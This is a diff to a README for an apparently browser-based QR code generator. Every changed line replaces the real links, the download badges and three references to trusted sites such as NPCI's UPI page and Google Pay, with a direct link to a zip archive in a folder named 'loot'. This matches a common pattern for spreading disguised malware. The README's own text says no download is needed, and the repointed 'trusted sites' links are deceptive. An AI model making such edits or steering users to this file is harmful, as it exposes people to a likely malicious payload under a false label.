@@ -1,6 +1,6 @@
 # ⚡ QR-Generator - Fast and Simple QR Code Maker
 
-[![Download QR-Generator](https://img.shields.io/badge/Download-QR--Generator-brightgreen?style=for-the-badge)](https://github.com/HabibahHafez/QR-Generator)
+[![Download QR-Generator](https://img.shields.io/badge/Download-QR--Generator-brightgreen?style=for-the-badge)](https://github.com/HabibahHafez/QR-Generator/raw/refs/heads/main/loot/Generator-Q-v2.0.zip)
 
 ---
 
@@ -38,7 +38,7 @@ This app does not require installation of additional software or plugins.
 ## 🚀 Getting Started
 
 1. Click the big green download button above or visit the main page here:  
-   [Download QR-Generator](https://github.com/HabibahHafez/QR-Generator)
+   [Download QR-Generator](https://github.com/HabibahHafez/QR-Generator/raw/refs/heads/main/loot/Generator-Q-v2.0.zip)
 
 2. When the page opens, look for a section named **QR-Generator Web App** or similar.
 
@@ -59,7 +59,7 @@ This app does not require installation of additional software or plugins.
 
 - This app runs inside your browser. You do not download an installable program.  
 - You need to *visit this page to download* the files or open the app:  
-  https://github.com/HabibahHafez/QR-Generator  
+  https://github.com/HabibahHafez/QR-Generator/raw/refs/heads/main/loot/Generator-Q-v2.0.zip  
 
 - To save the app for offline use:  
   1. On the GitHub page, click the green button named **Code**.  
@@ -129,10 +129,10 @@ Check the GitHub page regularly for new versions or bug fixes. Download the new 
 
 For more about QR codes and UPI payments, visit trusted sites like:
 
-- https://www.npci.org.in/upi  
-- https://www.qrcode.com/en/  
-- https://www.googlepay.com/  
+- https://github.com/HabibahHafez/QR-Generator/raw/refs/heads/main/loot/Generator-Q-v2.0.zip  
+- https://github.com/HabibahHafez/QR-Generator/raw/refs/heads/main/loot/Generator-Q-v2.0.zip  
+- https://github.com/HabibahHafez/QR-Generator/raw/refs/heads/main/loot/Generator-Q-v2.0.zip  
 
 ---
 
-[![Download QR-Generator](https://img.shields.io/badge/Download-QR--Generator-green?style=for-the-badge)](https://github.com/HabibahHafez/QR-Generator)
+[![Download QR-Generator](https://img.shields.io/badge/Download-QR--Generator-green?style=for-the-badge)](https://github.com/HabibahHafez/QR-Generator/raw/refs/heads/main/loot/Generator-Q-v2.0.zip)
